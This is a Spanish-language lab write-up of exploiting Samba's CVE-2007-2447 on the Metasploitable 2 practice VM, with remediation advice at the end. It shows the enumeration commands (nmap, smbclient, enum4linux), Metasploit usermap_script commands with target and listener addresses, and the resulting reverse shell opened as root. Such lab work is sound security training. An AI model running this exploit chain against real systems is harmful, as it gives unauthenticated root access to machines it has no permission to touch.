# 🛡️ Explotación de Samba – Metasploitable 2

---

## 📌 Visión General

Esta sección documenta la enumeración y explotación del **servicio Samba vulnerable** que se ejecuta en **Metasploitable 2**. El objetivo es identificar configuraciones incorrectas y vulnerabilidades, y finalmente obtener acceso al sistema.

---

## 1️⃣ Descubrimiento del Servicio

### 🔹 Escaneo con Nmap

```bash
nmap -p139,445 -sV 192.168.56.101
````

**Resultados:**

```text
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

✅ Samba detectado
✅ Versión obsoleta
✅ Alta probabilidad de vulnerabilidades conocidas

---

## 2️⃣ Enumeración de Recursos Compartidos

### 🔹 Listado de Shares

```bash
smbclient -L 192.168.56.101 -N
```

**Resultados:**

```text
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
```

✅ Acceso anónimo permitido
✅ El recurso **“tmp”** es escribible, lo que indica una mala configuración

---

## 3️⃣ Enumeración Avanzada

### 🔹 Enum4Linux

```bash
enum4linux -a 192.168.56.101
```

**Hallazgos clave:**

* Exposición de múltiples usuarios del sistema (por ejemplo: `root`, `www-data`, `ftp`, `msfadmin`)
* Workgroup: `WORKGROUP`
* Recursos compartidos accesibles sin credenciales

⚠️ **Configuración crítica incorrecta:** acceso anónimo + exposición de información de usuarios

---

## 4️⃣ Identificación de la Vulnerabilidad

La versión de Samba presente en Metasploitable 2 es conocida por ser vulnerable a:

✅ **CVE-2007-2447 – usermap_script RCE**

Esta vulnerabilidad permite **ejecución remota de comandos sin autenticación**, lo que conduce al compromiso total del sistema.

---

## 5️⃣ Explotación (Metasploit)

### 🔹 Lanzar Metasploit

```text
msfconsole
```

### 🔹 Cargar el Exploit

```text
use exploit/multi/samba/usermap_script
```

### 🔹 Configurar el Objetivo

```text
set RHOSTS 192.168.56.101
set LHOST 192.168.56.104
```

### 🔹 Ejecutar el Exploit

```text
run
```

---

## 6️⃣ Compromiso Exitoso

**Salida de la sesión:**

```text
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Command shell session 1 opened (192.168.56.104:4444 -> 192.168.56.101:38649)
```

### 🔹 Validación de Acceso

```bash
whoami
```

```text
root
```

```bash
id
```

```text
uid=0(root) gid=0(root)
```

```bash
uname -a
```

```text
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

```bash
hostname
```

```text
metasploitable
```

```bash
pwd
```

```text
/
```

✅ Acceso **root** completo
✅ No se requirieron credenciales
✅ Ejecución remota de código lograda

---

## 7️⃣ Análisis de Impacto

| Factor                  | Resultado                       |
| ----------------------- | ------------------------------- |
| Autenticación requerida | ❌ No                            |
| Nivel de privilegios    | ✅ Root                          |
| Complejidad del ataque  | ✅ Baja                          |
| Impacto                 | 🔥 Compromiso total del sistema |

**Conclusión:**
El servicio Samba vulnerable permite a un atacante no autenticado tomar control completo del sistema, demostrando un fallo crítico de seguridad.

---

## 8️⃣ Remediación

* Actualizar Samba a la última versión parcheada
* Deshabilitar `usermap_script`
* Eliminar el acceso anónimo
* Restringir los recursos compartidos
* Forzar autenticación y el principio de mínimo privilegio
* Realizar auditorías y parches de forma periódica

---

## ✅ Resumen

El servicio **Samba en Metasploitable 2** es **críticamente vulnerable**. Mediante **CVE-2007-2447**, se obtuvo con éxito una shell remota como **root** sin autenticación, demostrando el grave riesgo que suponen los servicios de red obsoletos y mal configurados.


